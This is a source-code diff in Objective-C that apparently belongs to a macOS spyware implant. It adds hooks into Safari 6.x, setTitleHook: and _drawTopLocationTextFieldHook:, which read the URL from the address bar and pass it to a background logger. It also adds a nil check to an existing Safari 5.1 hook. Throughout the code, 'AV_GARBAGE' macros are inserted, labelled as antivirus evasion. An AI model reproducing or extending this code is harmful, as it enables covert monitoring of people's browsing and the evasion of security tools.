@@ -30,8 +30,9 @@ static NSDate   *gURLDate     = nil;
 static NSString *gPrevURL     = nil;
 static BOOL gIsSnapshotActive = NO;
 static u_int gSnapID          = 0;
-
 static uint8_t gStopLog       = 0;
+
+static NSString *gLastURl = nil;
 
 void logSnapshot(NSData *imageData, int browserType)
 {
@@ -801,6 +802,122 @@ void URLStartAgent()
 
 @implementation myBrowserWindowController
 
+/*
+ * Hook for Safari 6.x
+ */
+
+- (void)setTitleHook:(NSString *)title
+{
+  [self setTitleHook: (title)];
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  NSString *_url = nil;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  @synchronized((id)&gLastURl)
+  {
+    if (gLastURl != nil)
+      _url = [gLastURl copy];
+  }
+  
+  if (_url == nil)
+  {
+    [pool release];
+    return;
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys:_url, @"url",
+                                                                       _agent, @"agent", nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  [NSThread detachNewThreadSelector: @selector(logURL:)
+                           toTarget: logObject
+                         withObject: urlDict];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  [logObject release];
+  [_agent release];
+  [_url release];
+  
+  [pool release];
+}
+
+- (void)_drawTopLocationTextFieldHook:(struct CGRect)arg1
+{
+  [self _drawTopLocationTextFieldHook:arg1];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  if ([self respondsToSelector:@selector(attributedStringValue)])
+  {
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
+    id tmp = (id) [self attributedStringValue];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008
+    
+    if (tmp != nil && [tmp length])
+    {
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
+      @synchronized((id)&gLastURl)
+      {
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
+        if (gLastURl != nil)
+          [gLastURl release];
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_004
+        
+        gLastURl = [[NSString alloc] initWithString:[tmp string]];
+      }
+    }
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  [pool release];
+}
+
+/*
+ * Hooks for Safari 5.1 >
+ */
+
 - (void)webFrameLoadCommittedHook: (id)arg1
 {
   // AV evasion: only on release build
@@ -817,13 +934,16 @@ void URLStartAgent()
   // AV evasion: only on release build
   AV_GARBAGE_001
   
+  if (_url == nil)
+    return;
+  
   myLoggingObject *logObject = [[myLoggingObject alloc] init];
   
   // AV evasion: only on release build
   AV_GARBAGE_002
   
   NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
-                           _agent, @"agent", nil];
+                                                                        _agent, @"agent", nil];
   
   // AV evasion: only on release build
   AV_GARBAGE_007
